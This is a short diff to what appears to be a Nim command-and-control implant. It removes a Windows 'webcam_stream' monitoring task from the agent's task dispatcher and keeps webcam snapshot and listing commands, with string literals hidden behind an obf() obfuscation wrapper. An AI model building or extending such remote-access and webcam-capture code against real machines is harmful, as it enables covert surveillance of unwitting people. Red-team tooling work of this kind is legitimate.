@@ -140,7 +140,7 @@ when defined(windows):
     import ../tasks/register_file
   when defined(cmd_deregister_file):
     import ../tasks/deregister_file
-  when defined(cmd_webcam_list) or defined(cmd_webcam_snap) or defined(cmd_webcam_stream):
+  when defined(cmd_webcam_list) or defined(cmd_webcam_snap):
     import ../tasks/webcam
 
 type
@@ -906,19 +906,6 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
             obf("completed"): true,
             obf("status"): "error",
             obf("user_output"): obf("webcam_snap command is only available on Windows")
-          }
-    
-    of obf("webcam_stream"):
-      when defined(cmd_webcam_stream):
-        when defined(windows):
-          debug "[DEBUG] Starting webcam_stream (monitoring task)"
-          result.response = webcamStream(taskId, params)
-        else:
-          result.response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("webcam_stream command is only available on Windows")
           }
     
     else:
